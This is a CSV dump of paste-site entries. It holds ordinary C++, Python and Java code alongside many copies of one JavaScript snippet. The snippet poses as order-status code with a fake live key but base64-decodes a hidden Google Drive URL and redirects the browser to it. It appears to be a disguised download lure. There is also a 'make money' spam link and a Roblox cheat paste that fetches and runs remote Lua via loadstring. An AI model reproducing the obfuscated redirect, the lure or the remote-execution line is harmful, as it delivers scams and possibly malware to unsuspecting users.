id,title,username,language,date,content
aKuWcf51,EARN $900 INSTANTLY 2025 XH,Pitrs7_cz,JavaScript,Friday 18th of April 2025 06:34:27 PM CDT," 
Pdf https://tinyurl.com/privguidee


hj7XxyLfLi
"
pCh7GNdc,Untitled,kammex,JavaScript,Friday 18th of April 2025 06:30:34 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/37538/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
paxyMrED,Products.js,kammex,JavaScript,Friday 18th of April 2025 06:15:11 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/73763/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
x0Wi1fcC,Order.js,kammex,JavaScript,Friday 18th of April 2025 05:59:48 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/79117/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
GD1Ry1zy,Market.js,kammex,JavaScript,Friday 18th of April 2025 05:44:26 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/75999/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
gAwfXKHV,Untitled,kammex,JavaScript,Friday 18th of April 2025 05:29:02 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/15075/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Qddn8M7m,tree2,Korotkodul,C++,Friday 18th of April 2025 05:18:37 PM CDT,"#include <iostream>
#include <vector>
using namespace std;

const int inf = 2e9;

struct node {
    node* parent;
    node* l;
    node* r;
    int val;

    node(node* par) : parent(par), l(nullptr), r(nullptr), val(inf) {}
    node() : parent(nullptr), l(nullptr), r(nullptr), val(inf) {}
};

struct tree {
    vector<int> arr; // используется ТОЛЬКО для инициализации дерева
    node* main_root; // Изменен на указатель для удобства
    int cur_size = 0;

    // Создает поддерево
    node* create_subtree(node* par, int Li, int Ri) {
        if (Li > Ri) return nullptr; // Проверка на правильные границы

        node* root = new node(par);
        root->val = arr[(Ri + Li) / 2]; // устанавливаем значение корня

        // Создание левого и правого поддеревьев
        root->l = create_subtree(root, Li, (Ri + Li) / 2 - 1);
        root->r = create_subtree(root, (Ri + Li) / 2 + 1, Ri);

        return root; // Возвращаем указатель на созданный узел
    }

    // Инициализация дерева
    void create(vector<int> a) {
        arr = a;
        cur_size = a.size();
        if (a.size() == 0) {
            main_root = nullptr; // В случае пустого массива
        } else {
            main_root = create_subtree(nullptr, 0, arr.size() - 1);
        }
        cout << ""Tree created\n"";
    }

    // Обход дерева (in-order)
    void trav(node* root) {
        if (root == nullptr) return; // Проверка на nullptr
        trav(root->l); // Обход левого поддерева
        cout << root->val << "" ""; // Обработка текущего узла
        trav(root->r); // Обход правого поддерева
    }

    void replace_el(node* root, int Li, int Ri, int i, int x) {
        if (root == nullptr) return;

        int mid = (Li + Ri) / 2;
        if (i == mid) {  // Нашли узел, который нужно заменить
            root->val = x;
            return;
        }

        if (i < mid) {
            replace_el(root->l, Li, mid - 1, i, x);  // Ищем в левом поддереве
        } else {
            replace_el(root->r, mid + 1, Ri, i, x);  // Ищем в правом поддереве
        }
    }
};

int main() {
    tree T;
    vector<int> a = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19};
    T.create(a);
    cout << ""TRAVERSAL ORDER:\n"";
    T.trav(T.main_root); cout << ""\n"";
    /*T.replace_el(T.main_root, 0, T.cur_size - 1, 0, 999);
    T.trav(T.main_root); cout << ""\n"";
    T.replace_el(T.main_root, 0, T.cur_size - 1, 18, 999);
    T.trav(T.main_root); cout << ""\n"";*/
    for (int i = 0; i < 19; ++i) {
        T.replace_el(T.main_root, 0, T.cur_size - 1, i, 999);
        T.trav(T.main_root); cout << ""\n"";
    }

    // Освобождение памяти
    // Здесь может быть реализована функция для удаления дерева и освобождения памяти
    return 0;
}
"
Q9HtBDLG,Untitled,dentira,JavaScript,Friday 18th of April 2025 05:12:50 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/23409/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
stb1h49D,Untitled,VladyCu,Python,Friday 18th of April 2025 05:10:28 PM CDT,"import subprocess
import time
import os
import sys
import logging

# Configuration
primary_gateway = ""172.30.1.1""
backup_gateway = ""172.30.2.1""
host_to_ping = ""8.8.8.8""
dhcp_config_file = ""/etc/dnsmasq.d/02-pihole-dhcp.conf""  # Path to the DHCP config file
dhcp_service_name = ""pihole-FTL.service""
ping_timeout = 3  # in seconds
ping_interval = 10  # in seconds
failure_threshold = 3  # Number of consecutive ping failures before switching

# Set up logging
logging.basicConfig(filename='/var/log/gateway_failover.log', level=logging.INFO,
                    format='%(asctime)s - %(message)s')

def log_message(message):
    logging.info(message)

# Check for root privileges
if os.geteuid() != 0:
    print(""This script requires root privileges."")
    sys.exit(1)

def change_gateway(gateway):
    """"""
    Changes the default gateway for the server and updates the DHCP configuration
    for all network clients.
    """"""
    try:
        subprocess.run([""ip"", ""route"", ""del"", ""default""], check=True)
        subprocess.run([""ip"", ""route"", ""add"", ""default"", ""via"", gateway], check=True)
        log_message(f""Server gateway changed to {gateway}"")
        update_dhcp_gateway(gateway)
        restart_dhcp_server()
    except subprocess.CalledProcessError as e:
        log_message(f""Error changing gateway: {e}"")

def update_dhcp_gateway(gateway):
    """"""
    Updates the DHCP configuration file to change the default gateway for clients.
    """"""
    try:
        with open(dhcp_config_file, 'r') as file:
            config = file.readlines()

        with open(dhcp_config_file, 'w') as file:
            for line in config:
                if ""dhcp-option=option:router"" in line:
                    file.write(f""dhcp-option=option:router,{gateway}\n"")
                else:
                    file.write(line)

        log_message(f""DHCP configuration updated with gateway {gateway}"")
    except Exception as e:
        log_message(f""Error updating DHCP config: {e}"")

def restart_dhcp_server():
    """"""
    Restarts the DHCP server to apply the new gateway settings to all clients.
    """"""
    try:
        subprocess.run([""systemctl"", ""restart"", dhcp_service_name], check=True)
        log_message(""DHCP server restarted successfully."")
    except subprocess.CalledProcessError as e:
        log_message(f""Error restarting DHCP server: {e}"")

def ping_host_via_wlan(host):
    """"""
    Pings the specified host using the Raspberry Pi's wlan0 interface.
    """"""
    result = subprocess.run(
        [""ping"", ""-I"", ""wlan0"", ""-c"", ""1"", ""-W"", str(ping_timeout), host],
        stdout=subprocess.DEVNULL
    )
    return result.returncode == 0

def ping_host(host):
    """"""
    Pings the specified host via current default interface.
    """"""
    result = subprocess.run(
        [""ping"", ""-c"", ""1"", ""-W"", str(ping_timeout), host],
        stdout=subprocess.DEVNULL
    )
    return result.returncode == 0

def main():
    current_gateway = primary_gateway
    consecutive_failures = 0
    wlan_successes = 0

    try:
        while True:
            if current_gateway == primary_gateway:
                if ping_host(host_to_ping):
                    consecutive_failures = 0
                else:
                    consecutive_failures += 1
                    if consecutive_failures >= failure_threshold:
                        change_gateway(backup_gateway)
                        current_gateway = backup_gateway
                        log_message(""Switched to backup gateway."")
                        wlan_successes = 0  # reset counter for recovery
            else:
                # On backup, check if we can reach via wlan0
                if ping_host_via_wlan(host_to_ping):
                    wlan_successes += 1
                    if wlan_successes >= 3:
                        change_gateway(primary_gateway)
                        current_gateway = primary_gateway
                        log_message(""Switched back to primary gateway."")
                        consecutive_failures = 0
                else:
                    wlan_successes = 0

            time.sleep(ping_interval)

    except KeyboardInterrupt:
        log_message(""Script terminated by user."")

if __name__ == ""__main__"":
    main()"
9c6wbpeU,tree1,Korotkodul,C++,Friday 18th of April 2025 05:01:00 PM CDT,"#include <iostream>
#include <vector>
using namespace std;

const int inf = 2e9;

struct node {
    node* parent;
    node* l;
    node* r;
    int val;

    node(node* par) : parent(par), l(nullptr), r(nullptr), val(inf) {}
    node() : parent(nullptr), l(nullptr), r(nullptr), val(inf) {}
};

struct tree {
    vector<int> arr; // используется ТОЛЬКО для инициализации дерева
    node* main_root; // Изменен на указатель для удобства
    int cur_size = 0;

    // Создает поддерево
    node* create_subtree(node* par, int Li, int Ri) {
        if (Li > Ri) return nullptr; // Проверка на правильные границы

        node* root = new node(par);
        root->val = arr[(Ri + Li) / 2]; // устанавливаем значение корня

        // Создание левого и правого поддеревьев
        root->l = create_subtree(root, Li, (Ri + Li) / 2 - 1);
        root->r = create_subtree(root, (Ri + Li) / 2 + 1, Ri);

        return root; // Возвращаем указатель на созданный узел
    }

    // Инициализация дерева
    void create(vector<int> a) {
        arr = a;
        cur_size = a.size();
        if (a.size() == 0) {
            main_root = nullptr; // В случае пустого массива
        } else {
            main_root = create_subtree(nullptr, 0, arr.size() - 1);
        }
        cout << ""Tree created\n"";
    }

    // Обход дерева (in-order)
    void trav(node* root) {
        if (root == nullptr) return; // Проверка на nullptr
        trav(root->l); // Обход левого поддерева
        cout << root->val << "" ""; // Обработка текущего узла
        trav(root->r); // Обход правого поддерева
    }
    /*
    void replace_el(node* root, int Li, int Ri, int i, int x) {
        if (root == nullptr) return;

        int mid = (Li + Ri) / 2;
        if (i == mid) {
            root->val = x;  // Нашли нужный индекс
            return;
        }
        if (i < mid) {
            replace_el(root->l, Li, mid - 1, i, x);  // Ищем в левом поддереве
        } else {
            replace_el(root->r, mid + 1, Ri, i, x);  // Ищем в правом поддереве
        }
    }*/

    void replace_el(node* root, int Li, int Ri, int i, int x) {
        if (root == nullptr) return;

        if (Li == Ri) {  // Если это лист, и его индекс == i
            if (i == Li) {
                root->val = x;
            }
            return;
        }

        int mid = (Li + Ri) / 2;
        if (i < mid) {
            replace_el(root->l, Li, mid, i, x);  // Ищем в левом поддереве
        } else {
            replace_el(root->r, mid + 1, Ri, i, x);  // Ищем в правом поддереве
        }
    }
};

int main() {
    tree T;
    vector<int> a = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19};
    T.create(a);
    cout << ""TRAVERSAL ORDER:\n"";
    T.trav(T.main_root); cout << ""\n"";
    T.replace_el(T.main_root, 0, T.cur_size - 1, 0, 999);
    T.trav(T.main_root); cout << ""\n"";
    T.replace_el(T.main_root, 0, T.cur_size - 1, 18, 999);
    T.trav(T.main_root); cout << ""\n"";

    // Освобождение памяти
    // Здесь может быть реализована функция для удаления дерева и освобождения памяти
    return 0;
}
"
kC0C4eWc,[🐰 Easter Update! ] Bubble Gum Simulator,ScriptSensical,C++,Friday 18th of April 2025 04:57:26 PM CDT,"This PasteBin has been updated for new Bubble Gum Simulator! 🐰 - Update date 2025-04-18 23:00 pm 

💻 Script: (Used in the video )
loadstring(game:HttpGet('https://raw.githubusercontent.com/BludnyHolandan/BGSI/refs/heads/main/bgsi/script.lua'))()
--{By Vofflann}--
 
📝 Updates:   (LAST UPDATE : 2025-04-18 Bubble Gum Simulator! 🐰 EASTER UPDATE! )

🔥 𝗡𝗼𝘁𝗶𝗰𝗲 🔥
Using third-party scripts in games may violate the games terms of service and could result in consequences for your account. Use scripts responsibly and at your own risk. Im not responsible for any accounts loss.

NOTE : Wait around 5 seconds before executing the script to fully load the game. Otherwise it will crash."
84bbFMRR,Products.js,dentira,JavaScript,Friday 18th of April 2025 04:57:20 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/58165/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
exJ6jXQW,[NP] Weather Station,dzocesrce,Java,Friday 18th of April 2025 04:56:27 PM CDT,"import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.stream.Collectors;
import java.text.DateFormat;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Scanner;

public class WeatherStationTest {
    public static void main(String[] args) throws ParseException {
        Scanner scanner = new Scanner(System.in);
        DateFormat df = new SimpleDateFormat(""dd.MM.yyyy HH:mm:ss"");
        int n = scanner.nextInt();
        scanner.nextLine();
        WeatherStation ws = new WeatherStation(n);
        while (true) {
            String line = scanner.nextLine();
            if (line.equals(""====="")) break;

            String[] parts = line.split("" "");
            float temp = Float.parseFloat(parts[0]);
            float wind = Float.parseFloat(parts[1]);
            float hum = Float.parseFloat(parts[2]);
            float vis = Float.parseFloat(parts[3]);

            String dateLine = scanner.nextLine();
            Date date = df.parse(dateLine);

            ws.addMeasurment(temp, wind, hum, vis, date);
        }

        Date from = df.parse(scanner.nextLine());
        Date to = df.parse(scanner.nextLine());

        System.out.println(ws.total());
        try {
            ws.status(from, to);
        } catch (RuntimeException e) {
            System.out.println(e);
        }
    }
}

class Measurment {
    float temp, wind, hum, vis;
    Date date;

    public Measurment(float temp, float wind, float hum, float vis, Date date) {
        this.temp = temp;
        this.wind = wind;
        this.hum = hum;
        this.vis = vis;
        this.date = date;
    }

    public Date getDate() {
        return date;
    }

    public float getTemp() {
        return temp;
    }

    @Override
    public String toString() {
        return String.format(""%.1f %.1f km/h %.1f%% %.1f km %s"", temp, wind, hum, vis, date);
    }
}

class WeatherStation {
    private final List<Measurment> measurments = new ArrayList<>();
    private final int previousDays;
    private static final long MILLS_IN_DAY = 1000L * 60 * 60 * 24;
    private static final long TWO_AND_HALF_MINUTES = 150000L;

    public WeatherStation(int days) {
        this.previousDays = days;
    }

    public void addMeasurment(float temp, float wind, float hum, float vis, Date date) {
        // Remove outdated measurements (older than x days from current)
        measurments.removeIf(m -> date.getTime() - m.getDate().getTime() > previousDays * MILLS_IN_DAY);

        // Check for duplicate measurements within 2.5 minutes
        for (Measurment m : measurments) {
            long diff = Math.abs(date.getTime() - m.getDate().getTime());
            if (diff < TWO_AND_HALF_MINUTES) return; // Ignore this measurement
        }

        // Add new measurement
        measurments.add(new Measurment(temp, wind, hum, vis, date));
    }

    public int total() {
        return measurments.size();
    }

    public void status(Date from, Date to) {
        List<Measurment> filtered = measurments.stream()
                .filter(m -> !m.getDate().before(from) && !m.getDate().after(to))
                .sorted(Comparator.comparing(Measurment::getDate))
                .collect(Collectors.toList());

        if (filtered.isEmpty())
            throw new RuntimeException();

        double avgTemp = filtered.stream().mapToDouble(Measurment::getTemp).average().orElse(0);

        for (Measurment m : filtered)
            System.out.println(m);

        System.out.printf(""Average temperature: %.2f\n"", avgTemp);
    }
}
"
SAxntEwj,Order.js,dentira,JavaScript,Friday 18th of April 2025 04:41:58 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/46829/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
2dMvJHbs,Market.js,dentira,JavaScript,Friday 18th of April 2025 04:26:36 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/94029/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
DrMeqVLF,Untitled,dentira,JavaScript,Friday 18th of April 2025 04:11:13 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/23272/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
